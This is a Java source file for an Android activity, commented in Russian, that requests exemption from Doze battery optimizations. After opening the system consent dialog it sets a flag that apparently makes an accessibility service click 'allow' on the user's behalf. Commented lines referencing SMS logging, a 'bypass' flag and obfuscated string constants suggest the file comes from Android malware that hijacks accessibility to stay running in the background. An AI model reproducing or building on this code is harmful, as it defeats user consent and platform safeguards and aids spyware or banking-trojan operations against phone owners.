// РАЗРЕШЕНИЕ ПРИЛОЖЕНИЯ ПОЗВОЛЯЕТ НЕ ОГРАНИЧИВАТЬ АКТИВНОСТЬ В DOZE MODE:

package com.test.myapp;

import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;

public class AskPermission_IGNORE_BATTERY_OPTIMIZATIONS extends AppCompatActivity {

    public static boolean is_dozemode(Context context){
        // Если целевая SDK больше или равно Android 6, SDK 23, то проверять есть ли в белом списке наше приложение
        if (Build.VERSION.SDK_INT >= 23) {
            PowerManager powerManager = (PowerManager) context.getSystemService(POWER_SERVICE);
            return powerManager.isIgnoringBatteryOptimizations(context.getPackageName());
        }
        else{
            return true;
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Doze mode появился лиш в Android 6.0 M - 23 SDK
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {


                // всегда проверяет включен ли в белый список наше приложение, если да, то активити снимит себя с задачи
                if (!is_dozemode(this)) {
                    try {

                        Intent intent1 = new Intent(
                                Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                                Uri.parse("package:" + getPackageName()));

                        intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        intent1.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                        intent1.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                        intent1.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);

                        startActivity(intent1);
                        MyAccessibilityService.ClassGen12Auto_Click =true;
//                    if(_engine_wrk_.NeedSuper())
//                    {
//
//                    }

                        // ClassGen12.bypass =true;

                    } catch (Exception ex) {
                        ex.printStackTrace();
                    }
                }
            }catch (Exception ex){
                //    utl.SettingsToAdd(this, consts.LogSMS , consts.string_140 + ex.toString() +consts.string_119);
            }
            finish();
        }
    }


}